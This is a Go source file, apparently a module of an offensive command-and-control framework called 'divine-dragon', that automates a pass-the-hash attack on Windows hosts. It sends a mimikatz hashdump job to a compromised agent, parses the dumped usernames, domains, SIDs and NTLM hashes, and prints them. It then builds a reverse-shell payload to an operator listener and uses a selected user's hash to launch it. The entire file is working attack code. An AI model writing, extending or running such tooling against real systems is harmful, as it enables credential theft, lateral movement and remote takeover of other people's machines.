package local_exploit

import (
	"bufio"
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"
	"time"
)

type PassTheHashModule struct {
	c2m         *c2.C2Module
	agentUuid   string
	listenHost  string
	listenPort  string
	dumpedUsers []dumpedUser
	logger      util.Logger
}

func NewPassTheHashModule(c2mOpt *c2.C2Module, agentUuidOpt, listenHostOpt, listenPortOpt string) *PassTheHashModule {
	pthm := PassTheHashModule{
		c2m:        c2mOpt,
		agentUuid:  agentUuidOpt,
		listenHost: listenHostOpt,
		listenPort: listenPortOpt,
	}
	pthm.logger = util.PassTheHashLogger(true, "")
	pthm.dumpedUsers = []dumpedUser{}
	return &pthm
}

func (pthm *PassTheHashModule) Run() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pthm.c2m.GetC2Hostname(), pthm.c2m.GetC2Port(), "mimikatz_hashdump", "windows", "amd64", "mimikatz_hashdump.exe")
	stpgm.Run()

	jobUuid, err := pthm.c2m.AddJob(pthm.agentUuid, "mimikatz_hashdump.exe")
	if err != nil {
		pthm.logger.Log.Error(err)
		return
	}
	pthm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pthm.c2m.GetAllAgentJobs(pthm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		// pthm.logger.Log.Info("Sleeping for 3 sec...")
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pthm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		pthm.logger.Log.Noticef("Job executed fine. Parsing the results...")
		if strings.Compare(results[jobUuid], "Job hasn't returned some output. But it seems ok.") == 0 {
			pthm.logger.Log.Info("Job executed fine, but it has no results. Stopping...")
			return
		} else {
			pthm.logger.Log.Info("Checking SeDebugPrivilege token...")
			if strings.Contains(results[jobUuid], "Privilege '20' OK") {
				pthm.logger.Log.Notice("SeDebugPrivilege is set.")
				pthm.ParseResults(results[jobUuid])
				pthm.PrintParsedResults()
				fmt.Println("Type a username to execute Pass The Hash attack in format DOMAIN\\USERNAME:")
				fmt.Println()
				scanner := bufio.NewScanner(os.Stdin)
				var selected dumpedUser
				for scanner.Scan() {
					username := scanner.Text()
					formattedUsername := util.FormatCommand(username)
					if strings.Compare(formattedUsername, "quit") == 0 || strings.Compare(formattedUsername, "exit") == 0 {
						return
					} else {
						splittedUsername := strings.Split(formattedUsername, "\\")
						if len(splittedUsername) == 2 {
							selectedUsername := splittedUsername[1]
							selectedDomain := splittedUsername[0]
							foundUsername := false
							for _, dumpedUser := range pthm.dumpedUsers {
								if selectedUsername == dumpedUser.Username && selectedDomain == dumpedUser.Domain {
									selected = dumpedUser
									foundUsername = true
								}
							}
							if foundUsername {
								break
							}
						} else {
							pthm.logger.Log.Error("Your input incorrect. Try again.\n")
						}
					}
				}
				pthm.runPthWithReverseShell(selected)
			} else {
				pthm.logger.Log.Error("Agent is running as user without SeDebugPrivilege.")
			}
		}
	}
}

type dumpedUser struct {
	Username string
	Domain   string
	Server   string
	Time     string
	SID      string
	NTLM     string
}

func (pthm *PassTheHashModule) ParseResults(results string) {
	identities := strings.Split(results, "Authentication Id")
	for _, identity := range identities {
		if strings.Contains(identity, "Primary") && !strings.Contains(identity, "UndefinedLogonType") && !strings.Contains(identity, "token::elevate") {
			identityProperties := strings.Split(identity, "\r\n")
			username := strings.Trim(strings.Split(identityProperties[2], ":")[1], " ")
			domain := strings.Trim(strings.Split(identityProperties[3], ":")[1], " ")
			server := strings.Trim(strings.Split(identityProperties[4], ":")[1], " ")
			time := strings.Trim(strings.Split(identityProperties[5], ":")[1], " ")
			sid := strings.Trim(strings.Split(identityProperties[6], ":")[1], " ")
			hash := strings.Trim(strings.Split(identityProperties[11], ":")[1], " ")
			pthm.dumpedUsers = append(pthm.dumpedUsers, dumpedUser{username, domain, server, time, sid, hash})
		}
	}
}

func (pthm *PassTheHashModule) PrintParsedResults() {
	if len(pthm.dumpedUsers) > 0 {
		pthm.logger.Log.Notice("Found some hashes. Printing out...")
		fmt.Println()
		w := tabwriter.NewWriter(os.Stdout, 1, 1, 1, ' ', 0)
		fmt.Fprintln(w, "Username\tDomain\tLogonServer\tLogonTime\tSID\tNTLM-hash")
		for _, dumpedUser := range pthm.dumpedUsers {
			fmt.Fprintf(w, "%s\t%s\t%s\t%s\t%s\t%s\n", dumpedUser.Username, dumpedUser.Domain, dumpedUser.Server, dumpedUser.Time, dumpedUser.SID, dumpedUser.NTLM)
		}
		w.Flush()
		fmt.Println()
	}
}

func (pthm *PassTheHashModule) runPthWithReverseShell(selected dumpedUser) {
	pthm.logger.Log.Infof("Don't forget to start a listener on %s:%s", pthm.listenHost, pthm.listenPort)
	pthm.logger.Log.Info("Generating a Reverse Shell payload...")
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pthm.listenHost, pthm.listenPort, "reverse_shell", "windows", "amd64", "revshell.exe")
	stpgm.Run()
	pthm.logger.Log.Info("Done")
	pthm.logger.Log.Info("Generating a Pass The Hash payload...")
	stpgm = payload_generator.NewStageTwoPayloadGeneratorModule(pthm.c2m.GetC2Hostname(), pthm.c2m.GetC2Port(), "mimikatz_pth_reverse_shell", "windows", "amd64", "mimikatz_pth_reverse_shell.exe")
	stpgm.SetPthParams(selected.Username, selected.Domain, selected.NTLM)
	stpgm.Run()
	pthm.logger.Log.Info("Done")
	jobUuid, err := pthm.c2m.AddJob(pthm.agentUuid, "mimikatz_pth_reverse_shell.exe")
	if err != nil {
		pthm.logger.Log.Error(err)
		return
	}
	pthm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = pthm.c2m.GetAllAgentJobs(pthm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		pthm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
	} else {
		pthm.logger.Log.Info("Job's completed. You supposed to be getting a PS reverse shell.")
	}
}

func (pthm *PassTheHashModule) RunPthWithReverseShell(user, domain, hash string) {
	selected := dumpedUser{Username: user, Domain: domain, NTLM: hash}
	pthm.runPthWithReverseShell(selected)
}
